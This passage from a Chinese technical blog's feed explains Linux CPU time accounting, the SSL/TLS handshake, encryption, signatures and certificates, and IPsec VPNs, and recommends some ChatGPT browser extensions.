class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">account_system_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> hardirq_offset, u64 cputime)</span><br>&#123;<br> <span class="hljs-keyword">if</span> (hardirq_count() - hardirq_offset)<br>  index = CPUTIME_IRQ;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (in_serving_softirq())<br>  index = CPUTIME_SOFTIRQ;<br> <span class="hljs-keyword">else</span><br>  index = CPUTIME_SYSTEM;<br><br> account_system_index_time(p, cputime, index);<br>&#125;<br></code></pre></td></tr></table></figure><p>内核态的时间主要分 3 种情况进行统计。</p><ul><li>如果当前处于硬中断执行上下文, 那么统计到 irq 字段中</li><li>如果当前处于软中断执行上下文, 那么统计到 softirq 字段中</li><li>否则统计到 system 字段中</li></ul><p>判断好要加到哪个统计项中后，依次调用 account_system_index_time、task_group_account_field 来将这段时间加到内核变量 kernel_cpustat 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">task_group_account_field</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> index,</span><br><span class="hljs-params">      u64 tmp)</span><br>&#123; <br> __this_cpu_add(kernel_cpustat.cpustat[index], tmp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3-空闲时间的累积"><a href="#3-3-空闲时间的累积" class="headerlink" title="3.3 空闲时间的累积"></a><strong>3.3 空闲时间的累积</strong></h3><p>没错，在内核变量 kernel_cpustat 中不仅仅是统计了各种用户态、内核态的使用统计，空闲也一并统计起来了。</p><p>如果在采样的瞬间，cpu 既不在内核态也不在用户态的话，就将当前节拍的时间都累加到 idle 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">account_idle_time</span><span class="hljs-params">(u64 cputime)</span><br>&#123;<br> u64 *cpustat = kcpustat_this_cpu-&gt;cpustat;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rq</span> *<span class="hljs-title">rq</span> =</span> this_rq();<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;rq-&gt;nr_iowait) &gt; <span class="hljs-number">0</span>)<br>  cpustat[CPUTIME_IOWAIT] += cputime;<br> <span class="hljs-keyword">else</span><br>  cpustat[CPUTIME_IDLE] += cputime;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 cpu 空闲的情况下，进一步判断当前是不是在等待 IO（例如磁盘 IO），如果是的话这段空闲时间会加到 iowait 中，否则就加到 idle 中。从这里，我们可以看到 iowait 其实是 cpu 的空闲时间，只不过是在等待 IO 完成而已。</p><p>看到这里，开篇问题 3 也有非常明确的答案了，io wait 其实是 cpu 在空闲状态的一项统计，只不过这种状态和 idle 的区别是 cpu 是因为等待 io 而空闲。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a><strong>四、总结</strong></h2><p>本文深入分析了 Linux 统计系统 CPU 利用率的内部原理。全文的内容可以用如下一张图来汇总：</p><p><img src="https://pic3.zhimg.com/80/v2-a3948248ff954fb87e06b81e50bca0f2_1440w.webp" alt="img"></p><p>Linux 中的定时器会以某个固定节拍，比如 1 ms 一次采样各个 cpu 核的使用情况，然后将当前节拍的所有时间都累加到 user&#x2F;nice&#x2F;system&#x2F;irq&#x2F;softirq&#x2F;io_wait&#x2F;idle 中的某一项上。</p><p>top 命令是读取的 &#x2F;proc&#x2F;stat 中输出的 cpu 各项利用率数据，而这个数据在内核中的是根据 kernel_cpustat 来汇总并输出的。</p><p>回到开篇问题 1，<strong>top 输出的利用率信息是如何计算出来的，它精确吗？</strong></p><p>&#x2F;proc&#x2F;stat 文件输出的是某个时间点的各个指标所占用的节拍数。如果想像 top 那样输出一个百分比，计算过程是分两个时间点 t1, t2 分别获取一下 stat 文件中的相关输出，然后经过个简单的算术运算便可以算出当前的 cpu 利用率。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：SSL/TLS协议</title>
    <link href="/2023/03/16/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ASSL-TLS%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/03/16/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ASSL-TLS%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：SSL-x2F-TLS协议"><a href="#应用层协议：SSL-x2F-TLS协议" class="headerlink" title="应用层协议：SSL&#x2F;TLS协议"></a>应用层协议：SSL&#x2F;TLS协议</h1><blockquote><p>转载自flydean大佬的一篇文章<a href="https://zhuanlan.zhihu.com/p/133375078">让你彻底弄懂SSL&#x2F;TLS协议</a></p></blockquote><p>SSL&#x2F;TLS是一种密码通信框架，他是世界上使用最广泛的密码通信方法。SSL&#x2F;TLS综合运用了密码学中的对称密码，消息认证码，公钥密码，数字签名，伪随机数生成器等，可以说是密码学中的集大成者。</p><p>SSL(Secure Socket Layer)安全套接层，是1994年由Netscape公司设计的一套协议，并与1995年发布了3.0版本。</p><p>TLS(Transport Layer Security)传输层安全是IETF在SSL3.0基础上设计的协议，实际上相当于SSL的后续版本。</p><h2 id="SSL-x2F-TLS的应用"><a href="#SSL-x2F-TLS的应用" class="headerlink" title="SSL&#x2F;TLS的应用"></a>SSL&#x2F;TLS的应用</h2><p><img src="https://pic4.zhimg.com/80/v2-d050edfb2dbf0501562764efc4a001a3_1440w.webp" alt="img"></p><p>SSL&#x2F;TLS是一个安全通信框架，上面可以承载HTTP协议或者SMTP&#x2F;POP3协议等。</p><h2 id="TLS协议的架构"><a href="#TLS协议的架构" class="headerlink" title="TLS协议的架构"></a>TLS协议的架构</h2><p><img src="https://pic3.zhimg.com/80/v2-74138889aeea5dbdfdcb4970caeaf5a2_1440w.webp" alt="img"></p><p>TLS主要分为两层，底层的是TLS记录协议，主要负责使用对称密码对消息进行加密。</p><p>上层的是TLS握手协议，主要分为握手协议，密码规格变更协议和应用数据协议4个部分。</p><ul><li>握手协议负责在客户端和服务器端商定密码算法和共享密钥，包括证书认证，是4个协议中最最复杂的部分。</li><li>密码规格变更协议负责向通信对象传达变更密码方式的信号</li><li>警告协议负责在发生错误的时候将错误传达给对方</li><li>应用数据协议负责将TLS承载的应用数据传达给通信对象的协议。</li></ul><h2 id="握手协议"><a href="#握手协议" class="headerlink" title="握手协议"></a>握手协议</h2><p>握手协议是TLS协议中非常重要的协议，通过客户端和服务器端的交互，和共享一些必要信息，从而生成共享密钥和交互证书。</p><p>如下图所示：</p><p><img src="https://pic4.zhimg.com/80/v2-5aff714cb0cd14387cfad488adef97db_1440w.webp" alt="img"></p><p>接下来我们一步步的介绍每一步的含义：</p><ol><li>client hello客户端向服务器端发送一个client hello的消息，包含下面内容：</li></ol><ul><li>可用版本号</li><li>当前时间</li><li>客户端随机数</li><li>会话ID</li><li>可用的密码套件清单</li><li>可用的压缩方式清单</li></ul><p>我们之前提到了TLS其实是一套加密框架，其中的有些组件其实是可以替换的，这里可用版本号，可用的密码套件清单，可用的压缩方式清单就是向服务器询问对方支持哪些服务。</p><p>客户端随机数是一个由客户端生成的随机数，用来生成对称密钥。</p><ol><li>server hello服务器端收到client hello消息后，会向客户端返回一个server hello消息，包含如下内容：</li></ol><ul><li>使用的版本号</li><li>当前时间</li><li>服务器随机数</li><li>会话ID</li><li>使用的密码套件</li><li>使用的压缩方式</li></ul><p>使用的版本号，使用的密码套件，使用的压缩方式是对步骤1的回答。</p><p>服务器随机数是一个由服务器端生成的随机数，用来生成对称密钥。</p><ol><li>可选步骤:certificate服务器端发送自己的证书清单，因为证书可能是层级结构的，所以处理服务器自己的证书之外，还需要发送为服务器签名的证书。<br>客户端将会对服务器端的证书进行验证。如果是以匿名的方式通信则不需要证书。</li><li>可选步骤:ServerKeyExchange<br>如果第三步的证书信息不足，则可以发送ServerKeyExchange用来构建加密通道。<br>ServerKeyExchange的内容可能包含两种形式：</li></ol><ul><li>如果选择的是RSA协议，那么传递的就是RSA构建公钥密码的参数（E，N）。我们回想一下RSA中构建公钥的公式：密文&#x3D;明文^E\ mod\ N密文&#x3D;明文<em>E<strong>mod</strong>N</em>， 只要知道了E和N，那么就知道了RSA的公钥，这里传递的就是E，N两个数字。具体内容可以参考<a href="https://link.zhihu.com/?target=http://www.flydean.com/rsa/">RSA算法详解</a></li><li>如果选择的是Diff-Hellman密钥交换协议，那么传递的就是密钥交换的参数，具体内容可以参考<a href="https://link.zhihu.com/?target=http://www.flydean.com/diffie-hellman/">更加安全的密钥生成方法Diffie-Hellman</a></li></ul><ol><li>可选步骤:CertificateRequest如果是在一个受限访问的环境，比如fabric中，服务器端也需要向客户端索要证书。<br>如果并不需要客户端认证，则不需要此步骤。</li><li>server hello done<br>服务器端发送server hello done的消息告诉客户端自己的消息结束了。</li><li>可选步骤:Certificate<br>对步骤5的回应，客户端发送客户端证书给服务器</li><li>ClientKeyExchange<br>分两种情况：</li></ol><ul><li>如果是公钥或者RSA模式情况下，客户端将根据客户端生成的随机数和服务器端生成的随机数，生成预备主密码，通过该公钥进行加密，返送给服务器端。</li><li>如果使用的是Diff-Hellman密钥交换协议，则客户端会发送自己这一方要生成Diff-Hellman密钥而需要公开的值。具体内容可以参考<a href="https://link.zhihu.com/?target=http://www.flydean.com/diffie-hellman/">更加安全的密钥生成方法Diffie-Hellman</a>，这样服务器端可以根据这个公开值计算出预备主密码。</li></ul><ol><li>可选步骤:CertificateVerify客户端向服务器端证明自己是客户端证书的持有者。</li><li>ChangeCipherSpec(准备切换密码)<br>ChangeCipherSpec是密码规格变更协议的消息，表示后面的消息将会以前面协商过的密钥进行加密。</li><li>finished(握手协议结束)<br>客户端告诉服务器端握手协议结束了。</li><li>ChangeCipherSpec(准备切换密码)<br>服务器端告诉客户端自己要切换密码了。</li><li>finished(握手协议结束)<br>服务器端告诉客户端，握手协议结束了。</li><li>切换到应用数据协议<br>这之后服务器和客户端就是以加密的方式进行沟通了。</li></ol><h2 id="主密码和预备主密码"><a href="#主密码和预备主密码" class="headerlink" title="主密码和预备主密码"></a>主密码和预备主密码</h2><p>上面的步骤8生成了预备主密码，主密码是根据密码套件中定义的单向散列函数实现的伪随机数生成器+预备主密码+客户端随机数+服务器端随机数生成的。</p><p>主密码主要用来生成称密码的密钥，消息认证码的密钥和对称密码的CBC模式所使用的初始化向量。详见<a href="https://link.zhihu.com/?target=http://www.flydean.com/block-cipher-mode/">分组密码和模式</a></p><h2 id="TLS记录协议"><a href="#TLS记录协议" class="headerlink" title="TLS记录协议"></a>TLS记录协议</h2><p>TLS记录协议主要负责消息的压缩，加密及数据的认证：</p><p><img src="https://pic4.zhimg.com/80/v2-9c57cb3c7c0be40ea8f0cfa59ebf4c4f_1440w.webp" alt="img"></p><p>消息首先将会被分段，然后压缩，再计算其消息验证码，然后使用对称密码进行加密，加密使用的是CBC模式，CBC模式的初始向量是通过主密码来生成的。</p><p>得到密文之后会附加类型，版本和长度等其他信息，最终组成最后的报文数据。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对称/非对称加密、数字签名、证书</title>
    <link href="/2023/03/16/%E5%AF%B9%E7%A7%B0-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E3%80%81%E8%AF%81%E4%B9%A6/"/>
    <url>/2023/03/16/%E5%AF%B9%E7%A7%B0-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E3%80%81%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="对称-x2F-非对称加密、数字签名、证书"><a href="#对称-x2F-非对称加密、数字签名、证书" class="headerlink" title="对称&#x2F;非对称加密、数字签名、证书"></a>对称&#x2F;非对称加密、数字签名、证书</h1><blockquote><p>本文主要介绍对称&#x2F;非对称加密、数字签名、证书的概述与优缺点等，相关HTTPS的中的实现可查看<a href="https://blog.longpi1.com/2023/03/11/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTPS%E5%8D%8F%E8%AE%AE/">应用层协议：HTTPS协议</a></p></blockquote><h2 id="一、对称加密"><a href="#一、对称加密" class="headerlink" title="一、对称加密"></a>一、对称加密</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><strong>对称密钥算法</strong>也可以称为<strong>私钥加密</strong>、<strong>共享密钥加密</strong>，是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中的一类加密算法。顾名思义，<strong>这种加密方式用相同的密钥进行加密和解密。</strong></p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>常见的对称加密算法有<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">AES</a>、<a href="https://zh.wikipedia.org/wiki/Salsa20">ChaCha20</a>、<a href="https://zh.wikipedia.org/wiki/3DES">3DES</a>、<a href="https://zh.wikipedia.org/wiki/Salsa20">Salsa20</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96">DES</a>、<a href="https://zh.wikipedia.org/wiki/Blowfish">Blowfish</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">IDEA</a>、<a href="https://zh.wikipedia.org/wiki/RC5">RC5</a>、<a href="https://zh.wikipedia.org/wiki/RC6">RC6</a>、<a href="https://zh.wikipedia.org/wiki/Camellia">Camellia</a>。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong>：对称加密的<strong>速度</strong>比<a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E9%92%A5%E5%8A%A0%E5%AF%86">非对称加密</a>快很多，在很多场合都需要对称加密。</p><p><strong>缺点</strong>：<strong>一切对称加密算法的软肋在于密钥的配送</strong>。加密和解密用同一个密钥，发送方必须设法把密钥发送给接收方。如果窃听者有能力窃取密文，肯定也可以窃取密钥，那么再无懈可击的算法依然不攻自破。存在<strong>密钥配送问题</strong>。</p><h2 id="二、非对称加密"><a href="#二、非对称加密" class="headerlink" title="二、非对称加密"></a>二、非对称加密</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p><strong>非对称式加密</strong>也称<strong>公开密钥密码学</strong>，是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>的一种<a href="https://zh.wikipedia.org/wiki/%E6%BC%94%E7%AE%97%E6%B3%95">算法</a>，它需要两个<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>，一个是公开密钥，另一个是私有密钥；公钥用作加密，私钥则用作解密。使用公钥把<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>加密后所得的<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>，只能用相对应的<a href="https://zh.wikipedia.org/wiki/%E7%A7%81%E9%92%A5">私钥</a>才能解密并得到原本的明文。<strong>由于加密和解密需要两个不同的密钥，故被称为非对称加密；</strong>不同于加密和解密都使用同一个密钥的<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密</a>。公钥可以公开，可任意向外发布；私钥不可以公开，必须由用户自行严格秘密保管，绝不透过任何途径向任何人提供，也不会透露给被信任的要通信的另一方。也就是<strong>私钥是钥匙，而公钥是锁，可以把锁公开出去，让别人把数据锁起来发给我；而钥匙一定要留在自己手里，用于解锁</strong>。</p><h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3><p>常见的公钥加密算法有：<a href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">RSA</a>、<a href="https://zh.wikipedia.org/wiki/ElGamal">ElGamal</a>、Rabin（RSA的特例）、<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95">DSA</a>、<a href="https://zh.wikipedia.org/wiki/ECDSA">ECDSA</a>。使用最广泛的是<a href="https://zh.wikipedia.org/wiki/RSA%E7%AE%97%E6%B3%95">RSA算法</a>（由发明者Rivest、Shmir和Adleman姓氏首字母缩写而来）是著名的公开秘钥加密算法。</p><h3 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong>：一定程度上解决<strong>密钥配送</strong>的问题</p><p><strong>缺点</strong>：<strong>非对称加密算法也无法确定通信双方的身份，依然会遭到中间人攻击</strong>。非对称加密解决了加密安全的问题，<strong>但是数据的加密安全只是数据安全的一个方面</strong>，<strong>数据的真实性同样非常重要</strong>。经常可以看到这样的案例，骗子在同学参加四、六级考试的时候，给同学的家长打电话或发短信，声称自己是学校的辅导员，并表示同学病重急需用钱，要求家长汇钱，同学家长汇钱给骗子而遭受巨大损失的情况。<strong>这就是数据&#x2F;信息真实性没有得到足够验证而产生的问题。</strong></p><h2 id="三、数字签名"><a href="#三、数字签名" class="headerlink" title="三、数字签名"></a>三、数字签名</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>如果某一用户使用他的私钥加密明文，任何人都可以用该用户的公钥解密密文；由于私钥只由该用户自己持有，故可以肯定该文件必定出自于该用户；公众可以验证该用户发布的数据或文件是否完整、中途有否曾被篡改，接收者可信赖这些数据、文件确实来自于该用户，这被称作<strong>数字签名</strong></p><p><strong>数字签名的作用本来就不是保证数据的机密性，而是证明你的身份</strong>，证明这些数据确实是由你本人发出的。</p><h3 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong>：<strong>数字签名可以一定程度上认证数据的来源</strong>。</p><p><strong>缺点</strong>：<strong>无法鉴别别人给你的公钥是不是对的。会不会有中间人冒充，发给你一个它的公钥。</strong></p><h2 id="四、公钥证书"><a href="#四、公钥证书" class="headerlink" title="四、公钥证书"></a>四、<strong>公钥证书</strong></h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p><strong>证书其实就是公钥 + 签名，由第三方认证机构颁发</strong>。引入可信任的第三方，是终结信任循环的一种可行方案。</p><h3 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h3><p>证书认证的流程大致如下：</p><p>1、Bob 去可信任的认证机构证实本人真实身份，并提供自己的公钥。</p><p>2、Alice 想跟 Bob 通信，首先向认证机构请求 Bob 的公钥，认证机构会把一张证书（Bob 的公钥以及对其公钥的签名）发送给 Alice。</p><p>3、Alice 检查签名，<strong>确定该公钥确实由这家认证机构发送</strong>，中途未被篡改。</p><p>4、Alice 通过这个公钥加密数据，开始和 Bob 通信。</p><p>PS：以上只是为了说明，证书只需要安装一次，并不需要每次都向认证机构请求；一般是服务器直接给客户端发送证书，而不是认证机构。</p><h3 id="优缺点-3"><a href="#优缺点-3" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点</strong>：有效避免了沟通过程中的信息泄露，成功规避了传统的中间人攻击；</p><p><strong>缺点</strong>：<strong>任何人都可以申请证书，导致存在很多不正规的认证机构证书，这些不正规证书很可能造成安全隐患</strong>。</p><h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/105087487">什么是对称&#x2F;非对称加密、密钥交换、数字签名、证书</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86">公开密钥加密</a></li><li><a href="https://time.geekbang.org/column/article/9492">趣谈网络协议</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非常实用的 ChatGPT 浏览器插件推荐</title>
    <link href="/2023/03/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <url>/2023/03/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h1 id="非常实用的ChatGPT-浏览器插件推荐"><a href="#非常实用的ChatGPT-浏览器插件推荐" class="headerlink" title="非常实用的ChatGPT 浏览器插件推荐"></a>非常实用的ChatGPT 浏览器插件推荐</h1><blockquote><p>本篇文章主要介绍ChatGPT相关的谷歌实用插件，关于ChatGPT的注册可查看<a href="https://www.xiaoheiwoo.com/how-to-register-chatgpt-for-free/">https://www.xiaoheiwoo.com/how-to-register-chatgpt-for-free/</a></p></blockquote><h2 id="一、chatgpt-for-google"><a href="#一、chatgpt-for-google" class="headerlink" title="一、chatgpt-for-google"></a>一、chatgpt-for-google</h2><blockquote><p>下载链接：<a href="https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf">https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf</a></p></blockquote><p>ChatGPT for Google扩展程序会在Google搜索结果旁边显示ChatGPT的响应。只需要使用该扩展程序登录到OpenAI，就可以开始使用，相当于同时使用两个搜索引擎。<img src="https://img-blog.csdnimg.cn/08303d8ce0a84b2aab2be910cd934b98.png" alt="在这里插入图片描述"></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>丰富搜索引擎</li><li>支持所有流行的搜索引擎</li><li>支持官方OpenAI API</li><li>支持 ChatGPT Plus</li><li>Markdown 渲染</li><li>代码亮点</li><li>提供反馈以改进 ChatGPT</li><li>自定义触发方式</li><li>切换语言</li></ul><h2 id="二、vscode-chatgpt"><a href="#二、vscode-chatgpt" class="headerlink" title="二、vscode-chatgpt"></a>二、vscode-chatgpt</h2><blockquote><p>下载链接：<a href="https://github.com/gencay/vscode-chatgpt">https://github.com/gencay/vscode-chatgpt</a></p></blockquote><p>vscode-chatgpt可实现代码响应检测，审核代码，找bug，甚至可以帮忙编写单测<br><img src="https://img-blog.csdnimg.cn/f6cc73ea39f7400e9de76040c1bbf642.png" alt="在这里插入图片描述"></p><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>响应检测</li><li>审核代码</li><li>找bug</li><li>编写单测</li><li>查找相关问题以及代码实现</li><li>暂时只支持VScode</li></ul><h2 id="三、OpenAI-Translator"><a href="#三、OpenAI-Translator" class="headerlink" title="三、OpenAI Translator"></a>三、OpenAI Translator</h2><blockquote><p>下载链接：<a href="https://github.com/yetone/openai-translator/releases">https://github.com/yetone/openai-translator/releases</a></p></blockquote><p>OpenAI Translator 是一款浏览器扩展，基于 ChatGPT API 进行划词翻译，支持 55 种语言的相互翻译和润色功能。目前还在扩展商店审核中，需要以开发者模式安装。安装后输入个人OpenAI 的 API KEY即可。<br><img width="800" src="https://user-images.githubusercontent.com/1206493/223200182-6a1d2a02-3fe0-4723-bdae-99d8b7212a33.gif"></p><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><ul><li>实时翻译，支持三种翻译模式：翻译、润色、总结</li><li>支持 55 种语言的相互翻译、润色和总结功能</li><li>支持自定义翻译文本</li><li>支持一键复制</li><li>有桌面端应用，全平台（Windows + macOS + Linux）支持！</li></ul>]]></content>
    
    
    <categories>
      
      <category>ChatGPT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>浏览器插件</tag>
      
      <tag>ChatGPT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：VPN协议</title>
    <link href="/2023/03/13/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AVPN%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/03/13/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AVPN%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：VPN协议"><a href="#应用层协议：VPN协议" class="headerlink" title="应用层协议：VPN协议"></a>应用层协议：VPN协议</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>VPN</strong>，全名 <strong>Virtual Private Network，虚拟专用网</strong>，就是<strong>利用开放的公众网络，建立专用数据传输通道</strong>，将远程的分支机构、移动办公人员等连接起来。</p><h2 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h2><p>VPN 通过隧道技术在公众网络上仿真一条点到点的专线，是通过利用一种协议来传输另外一种协议的技术，这里面涉及三种协议：乘客协议、隧道协议和承载协议。</p><p><strong>以 IPsec VPN协议为例来说明。</strong></p><p>Internet Protocol Security (IPsec)是一个安全网络协议套件，用于保护互联网或公共网络传输的数据。它可以完成认证加密数据包，从而为IP层网络设备提供安全加密通信。IPSec还被用到了VPN中。</p><p>IPsec包括了用于在客户端之间开始会话前建立相互认证和会话所用秘钥分发的协议簇。IPsec可以保护数据流在端到端，网络到网络，端到网络之间。IPsec使用密码安全服务来保护IP网络中的通信。它支持网络层对等身份认证，数据源认证，数据加密和重放保护。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><strong>私密性</strong>，防止信息泄露给未经授权的个人，通过加密把数据从明文变成无法读懂的密文，从而确保数据的私密性。加密可以分为对称加密和非对称加密。对称加密速度快一些。而 VPN 一旦建立，需要传输大量数据，因而我们采取对称加密。但是同样，对称加密还是存在加密密钥如何传输的问题，这里需要用到因特网密钥交换（IKE，Internet Key Exchange）协议。</li><li><strong>完整性</strong>，数据没有被非法篡改，通过对数据进行 hash 运算，产生类似于指纹的数据摘要，以保证数据的完整性。</li><li><strong>真实性</strong>，数据确实是由特定的对端发出，通过身份认证可以保证数据的真实性。</li></ul><p><strong>IPSec 不是一个协议，而是一套协议</strong>，基于以上三个特性，组成了 IPsec VPN 的协议簇。</p><p><img src="https://static001.geekbang.org/resource/image/e4/c2/e43f13e5c68c9a5455b3793fb530a4c2.jpeg?wh=1920*742" alt="img"></p><p>这个协议簇内容比较丰富。在这个协议簇里面，有两种协议，这两种协议的区别在于封装网络包的格式不一样。</p><ul><li>一种协议称为 <strong>AH（Authentication Header）</strong>，只能进行数据摘要 ，不能实现数据加密。</li><li>还有一种 <strong>ESP（Encapsulating Security Payload）</strong>，能够进行数据加密和数据摘要。</li></ul><p>在这个协议簇里面，还有两类算法，分别是<strong>加密算法和摘要算法</strong>。这个协议簇还包含两大组件，一个用于 VPN 的双方要进行对称密钥的交换的 IKE 组件，另一个是 VPN 的双方要对连接进行维护的 SA（Security Association）组件。</p><h3 id="建立过程"><a href="#建立过程" class="headerlink" title="建立过程"></a>建立过程</h3><blockquote><p>SA(Security Association)：是两个IPSec通信实体之间经协商建立起来的一种共同协定，它规定了通信双方使用哪种IPSec协议保护数据安全、应用的算法标识、加密和验证的密钥取值以及密钥的生存周期等等安全属性值。通过使用安全关联(SA) ， IPSec能够区分对不同的数据流提供的安全服务。</p></blockquote><p>关于 <strong>IPsec VPN</strong> 的建立过程，主要分两个阶段。</p><ul><li>一阶段：<strong>建立 IKE 自己的 SA</strong>，为双方进一步的IKE通信提供机密性、数据完整性以及数据源认证服务；</li><li>二阶段：<strong>建立IPsec SA</strong>，为数据交换提供<code>IPsec</code>服务；</li></ul><h3 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h3><p>IPSec 有两种不同的运行方式：<strong>隧道模式和传输模式</strong>。两者之间的区别在于 IPSec 如何处理数据包报头。</p><ul><li>在隧道模式下加密和验证整个 IP数据包（包括 IP 标头和有效负载），并附加一个新的报头；</li><li>在传输模式下，IPSec 